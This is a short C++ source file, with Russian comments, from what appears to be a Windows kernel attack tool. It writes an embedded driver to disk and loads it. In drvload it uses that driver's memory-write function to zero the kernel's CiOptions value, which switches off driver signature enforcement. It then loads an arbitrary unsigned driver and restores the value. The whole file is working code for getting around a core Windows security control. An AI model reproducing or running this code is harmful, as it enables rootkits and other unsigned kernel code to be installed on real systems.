#include "global.h"

// загрузка драйвера провайдера
void prov::prvDrvLoad () {
	prvDrvCreate();
	loadDriver(m_info_.szDriverPath);
	m_hDevice = CreateFileW(m_info_.szDevicePath, GENERIC_ALL, 0, nullptr, OPEN_EXISTING, 0, 0);
	chandle(m_hDevice);
}

// выгрузка
void prov::prvDrvUnload () {
	CloseHandle(m_hDevice);
	unloadDriver(m_info_.szDriverPath);
	ctrue(DeleteFile(m_info_.szDriverPath));
}

void prov::drvload (const wchar_t* szDrvPath) {
	void* pCiOptions = ntGetCiOptions();

	prvDrvLoad();
	char oldValue = 0, newValue = 0;
	write(&newValue, pCiOptions, sizeof(newValue), &oldValue);
	loadDriver(szDrvPath);
	write(&oldValue, pCiOptions, sizeof(newValue), &oldValue);
	prvDrvUnload();
}

void prov::prvDrvCreate () {
	if (exists(path(m_info_.szDriverPath)))
		return;

	HANDLE hFile = CreateFileW(m_info_.szDriverPath, GENERIC_ALL, 0, nullptr, CREATE_NEW, 0, nullptr);
	chandle(hFile);

	ctrue(WriteFile(hFile, m_info_.pBinary, m_info_.sizeBinary, nullptr, nullptr));
	CloseHandle(hFile);
}
